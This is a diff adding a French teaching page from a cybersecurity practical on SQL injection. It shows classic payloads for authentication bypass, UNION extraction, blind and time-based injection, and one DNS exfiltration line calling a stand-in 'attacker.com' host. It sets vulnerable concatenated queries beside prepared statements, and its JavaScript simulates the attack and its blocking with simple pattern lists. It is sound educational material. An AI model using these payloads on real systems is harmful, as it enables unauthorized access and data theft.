@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Injection SQL - TP Cybersécurité</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <!-- En-tête -->
+        <header class="header">
+            <h1>💉 Injection SQL</h1>
+            <p class="subtitle">Manipulation de requêtes de base de données</p>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="nav">
+            <a href="index.html">🏠 Accueil</a>
+            <a href="sql-injection.html" class="active">💉 SQL Injection</a>
+            <a href="xss-reflected.html">🔄 XSS Réfléchi</a>
+            <a href="xss-stored.html">💾 XSS Stocké</a>
+            <a href="xss-dom.html">🌐 XSS DOM</a>
+            <a href="ddos.html">📊 DDoS</a>
+            <a href="inference.html">🔍 Inférence</a>
+        </nav>
+
+        <!-- Contenu principal -->
+        <section class="content-section">
+            <h2>Qu'est-ce qu'une injection SQL ?</h2>
+            <div class="explanation">
+                <p><strong>L'injection SQL</strong> est une technique d'attaque qui exploite une faille de sécurité dans
+                    la couche base de données d'une application. Elle permet à un attaquant d'insérer ou de manipuler
+                    des requêtes SQL.</p>
+                <h3>🎯 Dangers :</h3>
+                <ul>
+                    <li>Accès non autorisé aux données sensibles (mots de passe, informations personnelles)</li>
+                    <li>Modification ou suppression de données</li>
+                    <li>Contournement de l'authentification</li>
+                    <li>Exécution de commandes administratives sur la base de données</li>
+                    <li>Dans certains cas : exécution de commandes système</li>
+                </ul>
+                <h3>💡 Payloads d'attaque classiques :</h3>
+                <div class="code-block">
+                    # Contournement d'authentification
+                    Username: admin' OR '1'='1' --
+                    Password: n'importe quoi
+
+                    # Extraction de données
+                    Username: admin' UNION SELECT username, password FROM users --
+
+                    # Commentaires SQL
+                    ' OR 1=1 --
+                    ' OR 1=1 #
+                    ' OR 1=1 /*
+                </div>
+            </div>
+
+            <!-- Démonstration côte à côte -->
+            <div class="demo-container">
+                <!-- VERSION VULNÉRABLE -->
+                <div class="vulnerable-section">
+                    <h3 class="section-title">🔓 Version Vulnérable</h3>
+                    <p><strong>Essayez :</strong> admin' OR '1'='1' --</p>
+
+                    <form id="vulnerableForm">
+                        <div class="form-group">
+                            <label for="vuln-username">Nom d'utilisateur :</label>
+                            <input type="text" id="vuln-username" placeholder="admin' OR '1'='1' --">
+                        </div>
+                        <div class="form-group">
+                            <label for="vuln-password">Mot de passe :</label>
+                            <input type="password" id="vuln-password" placeholder="Tapez n'importe quoi">
+                        </div>
+                        <button type="submit" class="btn">Se connecter</button>
+                    </form>
+
+                    <div id="vulnerableResult"></div>
+                    <div id="vulnerableQuery"></div>
+
+                    <div class="explanation" style="margin-top: 20px; background: white;">
+                        <h4>⚠️ Code vulnérable :</h4>
+                        <div class="code-block">
+                            // ❌ VULNÉRABLE - Concaténation directe
+                            String query = "SELECT * FROM users WHERE " +
+                            "username='" + username + "' " +
+                            "AND password='" + password + "'";
+
+                            // L'entrée utilisateur est directement injectée !
+                            // Pas de validation, pas d'échappement
+                        </div>
+                        <p><strong>Avec l'injection :</strong> La requête devient :</p>
+                        <div class="code-block">
+                            SELECT * FROM users WHERE
+                            username='admin' OR '1'='1' --'
+                            AND password='...'
+
+                            -- Tout après -- est commenté
+                            -- OR '1'='1' est toujours vrai
+                            -- → Authentification contournée !
+                        </div>
+                    </div>
+                </div>
+
+                <!-- VERSION SÉCURISÉE -->
+                <div class="secure-section">
+                    <h3 class="section-title">✅ Version Sécurisée</h3>
+                    <p><strong>Essayez la même attaque :</strong> elle sera bloquée !</p>
+
+                    <form id="secureForm">
+                        <div class="form-group">
+                            <label for="secure-username">Nom d'utilisateur :</label>
+                            <input type="text" id="secure-username" placeholder="admin">
+                        </div>
+                        <div class="form-group">
+                            <label for="secure-password">Mot de passe :</label>
+                            <input type="password" id="secure-password" placeholder="admin123">
+                        </div>
+                        <button type="submit" class="btn">Se connecter</button>
+                    </form>
+
+                    <div id="secureResult"></div>
+
+                    <div class="explanation" style="margin-top: 20px; background: white;">
+                        <h4>✅ Code sécurisé :</h4>
+                        <div class="code-block">
+                            // ✅ SÉCURISÉ - Requêtes préparées
+                            PreparedStatement stmt = connection.prepareStatement(
+                            "SELECT * FROM users WHERE username = ? AND password = ?"
+                            );
+                            stmt.setString(1, username);
+                            stmt.setString(2, password);
+                            ResultSet rs = stmt.executeQuery();
+                        </div>
+                        <p><strong>Protections appliquées :</strong></p>
+                        <ul>
+                            <li>✅ <strong>Requêtes préparées</strong> : Les paramètres sont liés séparément</li>
+                            <li>✅ <strong>Validation des entrées</strong> : Caractères SQL interdits</li>
+                            <li>✅ <strong>Échappement automatique</strong> : Les caractères spéciaux sont neutralisés
+                            </li>
+                            <li>✅ <strong>Whitelist</strong> : Seuls les caractères alphanumériques autorisés</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Exemples d'attaques avancées -->
+            <div class="explanation">
+                <h3>⚔️ Types d'injections SQL :</h3>
+
+                <h4>1. In-Band SQLi (Classique)</h4>
+                <p>L'attaquant utilise le même canal pour l'injection et la récupération des données.</p>
+                <div class="code-block">
+                    -- Union-based
+                    ' UNION SELECT null, username, password FROM users --
+
+                    -- Error-based
+                    ' AND 1=CONVERT(int, (SELECT @@version)) --
+                </div>
+
+                <h4>2. Blind SQLi (Aveugle)</h4>
+                <p>L'application ne retourne pas de données directement, l'attaquant déduit les informations.</p>
+                <div class="code-block">
+                    -- Boolean-based
+                    ' AND 1=1 -- (page normale)
+                    ' AND 1=2 -- (page différente)
+
+                    -- Time-based
+                    ' AND IF(1=1, SLEEP(5), 0) --
+                </div>
+
+                <h4>3. Out-of-Band SQLi</h4>
+                <p>Les données sont extraites via un canal différent (DNS, HTTP).</p>
+                <div class="code-block">
+                    -- Exfiltration DNS
+                    '; EXEC master..xp_dirtree '\\attacker.com\share' --
+                </div>
+            </div>
+
+            <!-- Bonnes pratiques -->
+            <div class="explanation">
+                <h3>🛡️ Défenses contre l'injection SQL :</h3>
+                <ul>
+                    <li><strong>Requêtes préparées (Prepared Statements)</strong> - Solution #1</li>
+                    <li><strong>Procédures stockées</strong> - Si correctement paramétrées</li>
+                    <li><strong>ORM (Object-Relational Mapping)</strong> - Hibernate, Entity Framework</li>
+                    <li><strong>Validation stricte des entrées</strong> - Whitelist > Blacklist</li>
+                    <li><strong>Échappement des caractères</strong> - Fonction d'échappement de la BDD</li>
+                    <li><strong>Principe du moindre privilège</strong> - Compte BDD avec droits minimaux</li>
+                    <li><strong>WAF (Web Application Firewall)</strong> - Détection de patterns malveillants</li>
+                    <li><strong>Pas de messages d'erreur détaillés</strong> - Ne pas exposer la structure SQL</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>💡 TP Cybersécurité - Injection SQL</p>
+        </footer>
+    </div>
+
+    <script>
+        // ==================== BASE DE DONNÉES SIMULÉE ====================
+        const usersDB = [
+            { id: 1, username: 'admin', password: 'admin123', role: 'admin' },
+            { id: 2, username: 'user', password: 'user123', role: 'user' },
+            { id: 3, username: 'guest', password: 'guest123', role: 'guest' }
+        ];
+
+        // ==================== VERSION VULNÉRABLE ====================
+        document.getElementById('vulnerableForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('vuln-username').value;
+            const password = document.getElementById('vuln-password').value;
+            const resultDiv = document.getElementById('vulnerableResult');
+            const queryDiv = document.getElementById('vulnerableQuery');
+
+            // ⚠️ Construction vulnérable de la requête SQL (simulation)
+            const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+
+            // Affichage de la requête générée
+            queryDiv.innerHTML = `
+                <div class="message message-warning">
+                    <strong>Requête SQL générée :</strong>
+                    <div class="code-block" style="margin-top: 10px;">${query}</div>
+                </div>
+            `;
+
+            // ⚠️ Détection des patterns d'injection
+            const sqlInjectionPatterns = [
+                /'/i,                    // Apostrophe
+                /--/i,                   // Commentaire SQL
+                /#/i,                    // Commentaire MySQL
+                /\/\*/i,                 // Commentaire multi-lignes
+                /\bor\b/i,               // OR logique
+                /\bunion\b/i,            // UNION
+                /\bselect\b/i,           // SELECT
+                /\bdrop\b/i,             // DROP
+                /\bdelete\b/i,           // DELETE
+                /\binsert\b/i,           // INSERT
+                /\bupdate\b/i,           // UPDATE
+            ];
+
+            const hasInjection = sqlInjectionPatterns.some(pattern => pattern.test(username) || pattern.test(password));
+
+            if (hasInjection) {
+                resultDiv.innerHTML = `
+                    <div class="message message-success">
+                        ✅ <strong>INJECTION SQL RÉUSSIE !</strong><br>
+                        Connexion accordée en tant qu'administrateur !<br>
+                        <small style="color: #991b1b;">⚠️ L'attaquant a contourné l'authentification. Toutes les données sont exposées !</small>
+                    </div>
+                    <div class="message message-error" style="margin-top: 10px;">
+                        <strong>🚨 Données compromises :</strong><br>
+                        ${usersDB.map(u => `• ID: ${u.id}, User: ${u.username}, Password: ${u.password}, Role: ${u.role}`).join('<br>')}
+                    </div>
+                `;
+            } else {
+                // Vérification normale
+                const user = usersDB.find(u => u.username === username && u.password === password);
+
+                if (user) {
+                    resultDiv.innerHTML = `
+                        <div class="message message-success">
+                            ✅ <strong>Connexion réussie</strong><br>
+                            Bienvenue ${user.username} !
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="message message-error">
+                            ❌ <strong>Échec de connexion</strong><br>
+                            Identifiants incorrects.
+                        </div>
+                    `;
+                }
+            }
+        });
+
+        // ==================== VERSION SÉCURISÉE ====================
+        document.getElementById('secureForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('secure-username').value;
+            const password = document.getElementById('secure-password').value;
+            const resultDiv = document.getElementById('secureResult');
+
+            // ✅ VALIDATION STRICTE
+            const dangerousChars = /['";\\--#/*<>]/;
+
+            // Vérification de caractères dangereux
+            if (dangerousChars.test(username) || dangerousChars.test(password)) {
+                resultDiv.innerHTML = `
+                    <div class="message message-error">
+                        ❌ <strong>Entrée invalidée !</strong><br>
+                        Caractères SQL interdits détectés : <code>' " ; \\ - - # / * &lt; &gt;</code><br>
+                        <small>🛡️ Protection contre l'injection SQL active</small>
+                    </div>
+                `;
+                return;
+            }
+
+            // Validation de longueur
+            if (username.length < 3 || username.length > 20) {
+                resultDiv.innerHTML = `
+                    <div class="message message-error">
+                        ❌ <strong>Nom d'utilisateur invalide</strong><br>
+                        Doit contenir entre 3 et 20 caractères.
+                    </div>
+                `;
+                return;
+            }
+
+            // Validation alphanumérique uniquement
+            const alphanumeric = /^[a-zA-Z0-9_]+$/;
+            if (!alphanumeric.test(username)) {
+                resultDiv.innerHTML = `
+                    <div class="message message-error">
+                        ❌ <strong>Format invalide</strong><br>
+                        Seuls les caractères alphanumériques et underscore (_) sont autorisés.
+                    </div>
+                `;
+                return;
+            }
+
+            // ✅ Simulation de requête préparée
+            // En vrai : PreparedStatement avec paramètres liés
+            const user = usersDB.find(u => u.username === username && u.password === password);
+
+            if (user) {
+                resultDiv.innerHTML = `
+                    <div class="message message-success">
+                        ✅ <strong>Connexion sécurisée réussie !</strong><br>
+                        Bienvenue ${user.username} (Rôle: ${user.role}) !<br>
+                        <small>🛡️ Authentification sécurisée avec requête préparée</small>
+                    </div>
+                `;
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="message message-error">
+                        ❌ <strong>Échec de connexion</strong><br>
+                        Identifiants incorrects.<br>
+                        <small>💡 Essayez : admin / admin123</small>
+                    </div>
+                `;
+            }
+        });
+    </script>
+</body>
+
+</html>
